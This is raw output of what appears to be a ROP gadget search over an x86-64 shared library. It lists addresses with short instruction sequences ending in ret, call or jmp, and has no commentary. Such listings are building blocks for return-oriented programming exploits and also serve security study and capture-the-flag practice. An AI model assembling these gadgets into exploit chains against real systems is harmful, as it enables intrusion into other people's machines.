0x00002aaaaaaf6a3c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rip + 0x3a68d9] ; ret
0x00002aaaaabd225b : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, qword ptr [rsp - 0x50] ; ret
0x00002aaaaabd7564 : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rbx ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab51b3c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rax, rdi ; ret
0x00002aaaaac485dc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rdi, qword ptr [r13 + 0x70] ; call 0x1f8b2
0x00002aaaaac2fa6c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov rdx, qword ptr [rsi] ; mov qword ptr [rdi], rdx ; ret
0x00002aaaaac3d0bc : add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rcx], dx ; mov byte ptr [rcx + 2], dl ; ret
0x00002aaaaac3d0ac : add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rcx], dx ; ret
0x00002aaaaab7b15c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rdi], dx ; ret
0x00002aaaaab72e1c : add byte ptr [rax], al ; add byte ptr [rax], al ; mov word ptr [rdi], si ; mov rax, rdi ; ret
0x00002aaaaab7b22c : add byte ptr [rax], al ; add byte ptr [rax], al ; movdqu xmmword ptr [rdi - 1], xmm0 ; ret
0x00002aaaaab7b23c : add byte ptr [rax], al ; add byte ptr [rax], al ; movdqu xmmword ptr [rdi], xmm0 ; ret
0x00002aaaaab4f61c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx eax, byte ptr [rdx] ; ret
0x00002aaaaac2f69c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi - 1] ; mov byte ptr [rdi - 1], dl ; ret
0x00002aaaaac2fd7c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, byte ptr [rsi] ; mov byte ptr [rdi], dl ; ret
0x00002aaaaac2fd0c : add byte ptr [rax], al ; add byte ptr [rax], al ; movzx edx, word ptr [rsi] ; mov word ptr [rdi], dx ; ret
0x00002aaaaabed7ab : add byte ptr [rax], al ; add byte ptr [rax], al ; nop ; mov eax, edi ; ror ax, 8 ; ret
0x00002aaaaaaf558b : add byte ptr [rax], al ; add byte ptr [rax], al ; nop ; ret
0x00002aaaaac10177 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax + rax] ; ret
0x00002aaaaac07b78 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; ret
0x00002aaaaac10729 : add byte ptr [rax], al ; add byte ptr [rax], al ; nop dword ptr [rax] ; xor eax, eax ; ret
0x00002aaaaab09e6c : add byte ptr [rax], al ; add byte ptr [rax], al ; pmovmskb eax, xmm0 ; and eax, 8 ; ret
0x00002aaaaab6b132 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; pop r12 ; ret
0x00002aaaaabdda38 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret
0x00002aaaaab7f088 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; and eax, 0x3fc00 ; ret
0x00002aaaaab0f89a : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; mov eax, dword ptr [rax + 0x58] ; ret
0x00002aaaaab509b0 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaaaff6d4 : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbx ; ret
0x00002aaaaac6872c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rcx ; clc ; ret 0x6e1f
0x00002aaaaac68ab2 : add byte ptr [rax], al ; add byte ptr [rax], al ; push rax ; pop r9 ; clc ; ret 0x6e1f
0x00002aaaaabe9ddc : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; xor eax, eax ; mov rbp, rsp ; pop rbp ; ret
0x00002aaaaaaeeee4 : add byte ptr [rax], al ; add byte ptr [rax], al ; pushfq ; ret
0x00002aaaaaad904c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac90fac : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0
0x00002aaaaaae345c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x16
0x00002aaaaaaf360c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18bb
0x00002aaaaaaf0384 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x18e7
0x00002aaaaac5364c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d4
0x00002aaaaac53de4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x1d5
0x00002aaaaaad8fec : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x23
0x00002aaaaac52654 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x24
0x00002aaaaaadaec4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x26
0x00002aaaaaad554a : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x2800
0x00002aaaaaae5e8c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x30
0x00002aaaaaae27b4 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x31
0x00002aaaaac52b44 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x33
0x00002aaaaaae0324 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x4f
0x00002aaaaaadd654 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x53
0x00002aaaaaae0534 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 0x56
0x00002aaaaac93794 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 1
0x00002aaaaac93414 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 3
0x00002aaaaaadc604 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 4
0x00002aaaaac91b88 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 5
0x00002aaaaaae2d9c : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 6
0x00002aaaaac91a38 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret 7
0x00002aaaaac5c38c : add byte ptr [rax], al ; add byte ptr [rax], al ; sar ah, 1 ; int1 ; push rax ; cld ; int1 ; call qword ptr [rax]
0x00002aaaaac01c3d : add byte ptr [rax], al ; add byte ptr [rax], al ; test eax, eax ; je 0x12cc5a ; xor eax, eax ; ret
0x00002aaaaaaeeecc : add byte ptr [rax], al ; add byte ptr [rax], al ; xchg eax, esp ; ret
0x00002aaaaab7dffc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor ch, ch ; mov byte ptr [rdi], ch ; ret
0x00002aaaaabf2ef4 : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; add rsp, 0x28 ; ret
0x00002aaaaabbbefc : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; add rsp, 8 ; ret
0x00002aaaaac01e0c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; ret
0x00002aaaaab0f7a2 : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; pop rbx ; ret
0x00002aaaaab4d29c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; ret
0x00002aaaaab4f38c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor eax, eax ; test rdx, rdx ; jne 0x7a3ab ; ret
0x00002aaaaab6ab9c : add byte ptr [rax], al ; add byte ptr [rax], al ; xor rax, rax ; ret
0x00002aaaaab68872 : add byte ptr [rax], al ; add byte ptr [rax], cl ; add byte ptr [rax], al ; je 0x93883 ; ret
0x00002aaaaab7dffd : add byte ptr [rax], al ; add byte ptr [rax], dh ; in eax, dx ; mov byte ptr [rdi], ch ; ret
0x00002aaaaac6920d : add byte ptr [rax], al ; add byte ptr [rax], dl ; add bl, bh ; jmp rax
0x00002aaaaaaed24d : add byte ptr [rax], al ; add byte ptr [rax], dl ; ret
0x00002aaaaab28991 : add byte ptr [rax], al ; add byte ptr [rbp + 0x310c75c0], al ; div dh ; ret 0x4050
0x00002aaaaaafea6f : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; leave ; call r15
0x00002aaaaab9756b : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; ror byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab69381 : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], al ; ror byte ptr [rcx - 0x39], cl ; ret
0x00002aaaaabe9ddd : add byte ptr [rax], al ; add byte ptr [rbp + 0x31], dl ; ror byte ptr [rax - 0x77], 0xe5 ; pop rbp ; ret
0x00002aaaaab29ccc : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; pop r14 ; ret
0x00002aaaaab29d9c : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; pop r13 ; ret
0x00002aaaaab45b6f : add byte ptr [rax], al ; add byte ptr [rbp + 0x41], bl ; pop rsp ; ret
0x00002aaaaac79cb9 : add byte ptr [rax], al ; add byte ptr [rbp + rbx*4 + 0x1900000], al ; out dx, al ; call qword ptr [rsi]
0x00002aaaaab4a19f : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x10 ; mov rdi, r12 ; call rbx
0x00002aaaaab4a0bc : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x18 ; mov rdi, r12 ; call rbx
0x00002aaaaac01377 : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 0x4c], cl ; and al, 0x30 ; call qword ptr [rax]
0x00002aaaaab42714 : add byte ptr [rax], al ; add byte ptr [rbp + rcx*4 + 5], cl ; ret 0x3549
0x00002aaaaac77ca9 : add byte ptr [rax], al ; add byte ptr [rbp + rdi*2], dh ; add al, dh ; in eax, dx ; jmp rsi
0x00002aaaaac8fce9 : add byte ptr [rax], al ; add byte ptr [rbp + rdi*8 + 0x54100001], dh ; clc ; call qword ptr [rax]
0x00002aaaaac7f499 : add byte ptr [rax], al ; add byte ptr [rbp + rsi*8], ah ; add byte ptr [rax], al ; and al, 0xf2 ; jmp qword ptr [rcx]
0x00002aaaaac7f481 : add byte ptr [rax], al ; add byte ptr [rbp + rsi*8], cl ; add al, ch ; and esi, edx ; jmp qword ptr [rcx]
0x00002aaaaac7ca1e : add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaab7ed31 : add byte ptr [rax], al ; add byte ptr [rbp - 0x6bf0be13], al ; ret 0xfe83
0x00002aaaaab4136d : add byte ptr [rax], al ; add byte ptr [rbp - 0x76bb7ffc], cl ; ret 0xf229
0x00002aaaaaaf9aae : add byte ptr [rax], al ; add byte ptr [rbp - 0x7b], cl ; test byte ptr [rdi], 0x85 ; ret 3
0x00002aaaaabaf653 : add byte ptr [rax], al ; add byte ptr [rbp - 0x7cb7fead], cl ; ret
0x00002aaaaabaa14d : add byte ptr [rax], al ; add byte ptr [rbp - 0x7cb7febd], cl ; ret
0x00002aaaaab40455 : add byte ptr [rax], al ; add byte ptr [rbp - 0xcfb8b37], al ; ret
0x00002aaaaac7dd4e : add byte ptr [rax], al ; add byte ptr [rbp - 0xf], bl ; jmp qword ptr [rcx]
0x00002aaaaab4c42d : add byte ptr [rax], al ; add byte ptr [rbx + 0x2002507], cl ; add byte ptr [rax], al ; ret
0x00002aaaaab7f089 : add byte ptr [rax], al ; add byte ptr [rbx + 0x25], bl ; add ah, bh ; add eax, dword ptr [rax] ; ret
0x00002aaaaab68833 : add byte ptr [rax], al ; add byte ptr [rbx + 0x31], bl ; rcr byte ptr [rbp + 0x41], 0x5c ; ret
0x00002aaaaaba1866 : add byte ptr [rax], al ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0x00002aaaaab27c8b : add byte ptr [rax], al ; add byte ptr [rbx + 0x44], bl ; mov eax, eax ; pop rbp ; pop r12 ; ret
0x00002aaaaab7a1bd : add byte ptr [rax], al ; add byte ptr [rbx + 0x477880e], cl ; mov dword ptr [rdi], ecx ; ret
0x00002aaaaac3f43d : add byte ptr [rax], al ; add byte ptr [rbx + 0x48028901], cl ; lea eax, dword ptr [rdx + 3] ; ret
0x00002aaaaac427ed : add byte ptr [rax], al ; add byte ptr [rbx + 0x48028901], cl ; mov eax, edi ; ret
0x00002aaaaab7c5dd : add byte ptr [rax], al ; add byte ptr [rbx + 0x48178916], cl ; lea eax, dword ptr [rdi + 4] ; ret
0x00002aaaaab44c7f : add byte ptr [rax], al ; add byte ptr [rbx + 0x48], bl ; mov eax, esi ; pop rbp ; pop r12 ; ret
0x00002aaaaac2f50d : add byte ptr [rax], al ; add byte ptr [rbx + 0x5789fc56], cl ; cld ; ret
0x00002aaaaabaa03e : add byte ptr [rax], al ; add byte ptr [rbx + 0x5b010443], al ; pop rbp ; pop r12 ; ret
0x00002aaaaab4a01b : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; pop r14 ; ret
0x00002aaaaaafeda9 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; pop r13 ; ret
0x00002aaaaab0aa94 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; pop r12 ; ret
0x00002aaaaab0a8d6 : add byte ptr [rax], al ; add byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab4cf0d : add byte ptr [rax], al ; add byte ptr [rbx + 0x5e8c107], cl ; and eax, 1 ; ret
0x00002aaaaac81c49 : add byte ptr [rax], al ; add byte ptr [rbx + 0x66b00001], dl ; stc ; call qword ptr [rax]
0x00002aaaaabca37d : add byte ptr [rax], al ; add byte ptr [rbx + 0x6890447], cl ; xor eax, eax ; ret
0x00002aaaaab4c3fd : add byte ptr [rax], al ; add byte ptr [rbx + 0x8042507], cl ; add byte ptr [rax], al ; ret
0x00002aaaaac7a28e : add byte ptr [rax], al ; add byte ptr [rbx + 0xe], cl ; adc byte ptr [rbx + 0xa440202], al ; ret
0x00002aaaaab0f9fd : add byte ptr [rax], al ; add byte ptr [rbx + 0xf48fffa], al ; ret
0x00002aaaaac44c98 : add byte ptr [rax], al ; add byte ptr [rbx + rax - 9], bh ; fadd st(3) ; ret
0x00002aaaaac79a59 : add byte ptr [rax], al ; add byte ptr [rbx + rbx*4], ah ; add byte ptr [rax], al ; mov al, 0xf0 ; in eax, dx ; call rsi
0x00002aaaaabe0da8 : add byte ptr [rax], al ; add byte ptr [rbx + rcx + 0x5b], dh ; mov eax, edx ; pop rbp ; pop r12 ; ret
0x00002aaaaac80ac1 : add byte ptr [rax], al ; add byte ptr [rbx + rcx - 0x7847ffff], cl ; call qword ptr [rsi]
0x00002aaaaac74ab9 : add byte ptr [rax], al ; add byte ptr [rbx + rcx*2 + 0x32400000], al ; jmp 0x19facd
0x00002aaaaac84ae1 : add byte ptr [rax], al ; add byte ptr [rbx + rcx*2 + 0x6c080001], ch ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac7ca49 : add byte ptr [rax], al ; add byte ptr [rbx + rcx*8], dl ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac812c1 : add byte ptr [rax], al ; add byte ptr [rbx + rdx - 0x24f7ffff], cl ; call qword ptr [rdi]
0x00002aaaaac81249 : add byte ptr [rax], al ; add byte ptr [rbx + rdx], dl ; add dword ptr [rax], eax ; sbb dl, 0xf3 ; jmp qword ptr [rcx]
0x00002aaaaac832c9 : add byte ptr [rax], al ; add byte ptr [rbx + rsi - 0x16ffffff], dl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac8f2b1 : add byte ptr [rax], al ; add byte ptr [rbx + rsi*8 + 1], bh ; add byte ptr [rax + 0x16], bl ; clc ; jmp qword ptr [rcx]
0x00002aaaaac8f269 : add byte ptr [rax], al ; add byte ptr [rbx + rsi*8], dh ; add dword ptr [rax], eax ; add byte ptr [rsi], dl ; clc ; call qword ptr [rdx]
0x00002aaaaab2f37c : add byte ptr [rax], al ; add byte ptr [rbx - 0x109743], al ; call qword ptr [rax]
0x00002aaaaab4962d : add byte ptr [rax], al ; add byte ptr [rbx - 0x3b7cb7fe], cl ; sbb byte ptr [rbx + 0x5d], bl ; ret
0x00002aaaaab7f10d : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x10 ; pop rbx ; ret
0x00002aaaaab7f106 : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x20 ; pop rbx ; ret
0x00002aaaaab7f0ff : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x30 ; pop rbx ; ret
0x00002aaaaab7f0f8 : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x40 ; pop rbx ; ret
0x00002aaaaab7f0f1 : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x60 ; pop rbx ; ret
0x00002aaaaab7f0ea : add byte ptr [rax], al ; add byte ptr [rbx - 0x3d], bl ; mov eax, 0x80 ; pop rbx ; ret
0x00002aaaaabda3d9 : add byte ptr [rax], al ; add byte ptr [rbx - 0x3f7ac7c0], cl ; cmove eax, edx ; ret
0x00002aaaaabe959d : add byte ptr [rax], al ; add byte ptr [rbx - 0x3f7aefb9], cl ; jne 0x1145bb ; ret
0x00002aaaaab2c21c : add byte ptr [rax], al ; add byte ptr [rbx - 0x4e343], al ; call qword ptr [rax]
0x00002aaaaac822f1 : add byte ptr [rax], al ; add byte ptr [rbx - 0x64d7ffff], bh ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac822d9 : add byte ptr [rax], al ; add byte ptr [rbx - 0x64efffff], ah ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac822c1 : add byte ptr [rax], al ; add byte ptr [rbx - 0x6507ffff], cl ; hlt ; jmp qword ptr [rcx]
0x00002aaaaab0f89b : add byte ptr [rax], al ; add byte ptr [rbx - 0x75], bl ; pop rax ; ret
0x00002aaaaab1ca0e : add byte ptr [rax], al ; add byte ptr [rbx - 0x77], bl ; rcr byte ptr [rbp + 0x41], 1 ; pop rsp ; ret
0x00002aaaaaaf576d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7a2dcf00], cl ; ror byte ptr [rdi], 0x94 ; ret 0x8d48
0x00002aaaaabb581d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7af0f71a], al ; ret
0x00002aaaaac10a1d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7cb703b6], cl ; ret 0x4808
0x00002aaaaabb5c0d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7cb7fe3f], al ; ret 0x4404
0x00002aaaaabbdbdd : add byte ptr [rax], al ; add byte ptr [rbx - 0x7cb7fe40], al ; ret 0x4108
0x00002aaaaabd5e4d : add byte ptr [rax], al ; add byte ptr [rbx - 0x7d], dl ; call qword ptr [rcx]
0x00002aaaaabe9f7d : add byte ptr [rax], al ; add byte ptr [rbx - 0xd8a0008], al ; xor eax, eax ; leave ; ret
0x00002aaaaab47fd4 : add byte ptr [rax], al ; add byte ptr [rbx - 0xd], bl ; ret
0x00002aaaaac91601 : add byte ptr [rax], al ; add byte ptr [rbx], bh ; add eax, 0x1e70000 ; add byte ptr [rax], al ; ret 4
0x00002aaaaac7c16e : add byte ptr [rax], al ; add byte ptr [rbx], ch ; cli ; call qword ptr [rdi]
0x00002aaaaab89bc6 : add byte ptr [rax], al ; add byte ptr [rcx + 0x29], al ; ret 0x8341
0x00002aaaaac3d0fd : add byte ptr [rax], al ; add byte ptr [rcx + 0x3518911], cl ; ret
0x00002aaaaac03f59 : add byte ptr [rax], al ; add byte ptr [rcx + 0x39], cl ; ret 0x850f
0x00002aaaaabcb8bc : add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaab447d7 : add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5bd8], cl ; pop rsp ; ret
0x00002aaaaab451e0 : add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5be8], cl ; pop rsp ; pop r13 ; ret
0x00002aaaaabeae1e : add byte ptr [rax], al ; add byte ptr [rcx + 0x415d5bf0], cl ; pop rsp ; ret
0x00002aaaaac3d0dd : add byte ptr [rax], al ; add byte ptr [rcx + 0x4518811], cl ; ret
0x00002aaaaab7b18d : add byte ptr [rax], al ; add byte ptr [rcx + 0x4578817], cl ; ret
0x00002aaaaab50a04 : add byte ptr [rax], al ; add byte ptr [rcx + 0x48d231d1], cl ; mov eax, dword ptr [rax + 0x48] ; jmp rax
0x00002aaaaab4a510 : add byte ptr [rax], al ; add byte ptr [rcx + 0x5bd089c2], cl ; ret
0x00002aaaaab47b7a : add byte ptr [rax], al ; add byte ptr [rcx + 0x5d5b7453], cl ; pop r12 ; ret
0x00002aaaaab1cc8e : add byte ptr [rax], al ; add byte ptr [rcx + 0x63], cl ; or al, 0x8b ; add rcx, r11 ; jmp rcx
0x00002aaaaab98de0 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; fiadd word ptr [r9] ; ret
0x00002aaaaab2b802 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0x83 ; ret
0x00002aaaaab2b785 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; mov dh, 0x56 ; or al, 0xf6 ; ret 0xf08
0x00002aaaaab0b2c7 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; xchg eax, esi ; ret 0x394c
0x00002aaaaab7ed50 : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], al ; xchg eax, esp ; ret
0x00002aaaaab22c1e : add byte ptr [rax], al ; add byte ptr [rcx + 0xf], cl ; ret
0x00002aaaaab7e7dd : add byte ptr [rax], al ; add byte ptr [rcx + 1], cl ; ret
0x00002aaaaac91131 : add byte ptr [rax], al ; add byte ptr [rcx + 6], dl ; add byte ptr [rax], al ; ret 2
0x00002aaaaac7c079 : add byte ptr [rax], al ; add byte ptr [rcx + rax*8], al ; add al, dl ; jrcxz 0x1a707c ; call rsp
0x00002aaaaac70061 : add byte ptr [rax], al ; add byte ptr [rcx + rax], ch ; add byte ptr [rax], al ; call 0x111998cf
0x00002aaaaac76889 : add byte ptr [rax], al ; add byte ptr [rcx + rbp*2], dl ; add byte ptr [rax], ah ; add ebp, ebp ; call qword ptr [rsi]
0x00002aaaaac8a8a1 : add byte ptr [rax], al ; add byte ptr [rcx + rbp*4 + 1], ch ; add byte ptr [rax], cl ; loop 0x1b58b0 ; call rsi
0x00002aaaaac7a879 : add byte ptr [rax], al ; add byte ptr [rcx + rbp*4], al ; add byte ptr [rax], ah ; out dx, al ; call qword ptr [rdx]
0x00002aaaaac7a841 : add byte ptr [rax], al ; add byte ptr [rcx + rbp*4], cl ; add byte ptr [rax], al ; mov byte ptr [rsi - 0x12], cl ; jmp qword ptr [rdx]
0x00002aaaaac7d869 : add byte ptr [rax], al ; add byte ptr [rcx + rbx*8], dh ; add byte ptr [rax], al ; and dword ptr [rdi], ebp ; int1 ; jmp qword ptr [rax]
0x00002aaaaab9e21f : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 + 0x32], ah ; add rsp, 0x18 ; ret
0x00002aaaaab9e2e9 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 + 0x32], ah ; add rsp, 8 ; ret
0x00002aaaaabb8ba1 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 + 0x34], cl ; ret 0x3944
0x00002aaaaab046d5 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rax
0x00002aaaaabd7b61 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x11], cl ; call rbx
0x00002aaaaabd7c95 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x19], cl ; call rbx
0x00002aaaaab5d14d : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x1a], cl ; mov rdi, rbp ; call rax
0x00002aaaaabadc28 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x3e], cl ; jmp 0xd8c3f
0x00002aaaaab46034 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x40], al ; pop rbx ; ret
0x00002aaaaab52f33 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 0x40], cl ; ret
0x00002aaaaabd7aca : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; call rbx
0x00002aaaaac0c4ab : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 1], cl ; lea r9, qword ptr [rsp + 0x2a] ; call qword ptr [rax]
0x00002aaaaabd7ad9 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 9], cl ; call rbx
0x00002aaaaac00ddf : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4 - 9], cl ; lea r9, qword ptr [rsp + 0x1c] ; call qword ptr [rax]
0x00002aaaaac78841 : add byte ptr [rax], al ; add byte ptr [rcx + rcx*4], cl ; add byte ptr [rax], al ; fdivr dword ptr [rcx - 0x13] ; jmp qword ptr [rcx]
0x00002aaaaac83849 : add byte ptr [rax], al ; add byte ptr [rcx + rdi], dl ; add dword ptr [rax], eax ; adc bh, bh ; hlt ; call rsi
0x00002aaaaac710c9 : add byte ptr [rax], al ; add byte ptr [rcx + rdx + 0x71100000], dl ; std ; jmp qword ptr [rdi]
0x00002aaaaac850c1 : add byte ptr [rax], al ; add byte ptr [rcx + rdx*2 + 0x72680001], cl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac85079 : add byte ptr [rax], al ; add byte ptr [rcx + rdx*2 + 1], al ; add byte ptr [rax], ah ; jb 0x1b0082 ; jmp qword ptr [rcx]
0x00002aaaaac850a9 : add byte ptr [rax], al ; add byte ptr [rcx + rdx*2 + 1], dh ; add byte ptr [rax + 0x72], dl ; cmc ; jmp qword ptr [rcx]
0x00002aaaaac790a9 : add byte ptr [rax], al ; add byte ptr [rcx + rdx*4], dh ; add byte ptr [rax], al ; nop ; in eax, dx ; call qword ptr [rdx]
0x00002aaaaac7d071 : add byte ptr [rax], al ; add byte ptr [rcx + rdx*8], bh ; add byte ptr [rax], al ; fdiv st(0) ; call qword ptr [rax]
0x00002aaaaac71079 : add byte ptr [rax], al ; add byte ptr [rcx + rdx], al ; add al, ah ; in eax, -0x18 ; call qword ptr [rdx]
0x00002aaaaac87059 : add byte ptr [rax], al ; add byte ptr [rcx + rsi*2], ah ; add dword ptr [rax], eax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac87071 : add byte ptr [rax], al ; add byte ptr [rcx + rsi*2], bh ; add dword ptr [rax], eax ; pop rax ; and esi, esi ; jmp qword ptr [rsi]
0x00002aaaaac77089 : add byte ptr [rax], al ; add byte ptr [rcx + rsi*2], dl ; add byte ptr [rax], dh ; in eax, dx ; call rdx
0x00002aaaaac7f0d9 : add byte ptr [rax], al ; add byte ptr [rcx + rsi*8 + 0x15700000], ah ; jmp qword ptr [rcx]
0x00002aaaaac7f069 : add byte ptr [rax], al ; add byte ptr [rcx + rsi*8], dh ; add byte ptr [rax], al ; loopne 0x1aa090 ; call qword ptr [rdx]
0x00002aaaaac730b1 : add byte ptr [rax], al ; add byte ptr [rcx + rsi], bh ; add al, bh ; ret
0x00002aaaaabca38d : add byte ptr [rax], al ; add byte ptr [rcx - 0x3fcefb89], cl ; ret
0x00002aaaaab15f7d : add byte ptr [rax], al ; add byte ptr [rcx - 0x43], al ; add eax, dword ptr [rax + rax] ; add cl, ch ; ret 0xffec
0x00002aaaaab87098 : add byte ptr [rax], al ; add byte ptr [rcx - 0x44], al ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaac485dd : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; jge 0x17365d ; call 0x1f8b1
0x00002aaaaab1af92 : add byte ptr [rax], al ; add byte ptr [rcx - 0x75], cl ; ret
0x00002aaaaab1cd67 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret 0xc083
0x00002aaaaabb21c7 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], al ; ret 0xc141
0x00002aaaaab62631 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret
0x00002aaaaab2fef4 : add byte ptr [rax], al ; add byte ptr [rcx - 0x77], cl ; ret 0x8b4c
0x00002aaaaab8a064 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; ret
0x00002aaaaab2633c : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], al ; std ; xor byte ptr [rdi], cl ; xchg eax, esp ; ret
0x00002aaaaabe3bbd : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret
0x00002aaaaab693ef : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4101
0x00002aaaaabb5ea4 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4801
0x00002aaaaaba97a0 : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4c01
0x00002aaaaabe453d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x4d30
0x00002aaaaac1926d : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0x7f10
0x00002aaaaab5e2ed : add byte ptr [rax], al ; add byte ptr [rcx - 0x7d], cl ; ret 0xf10
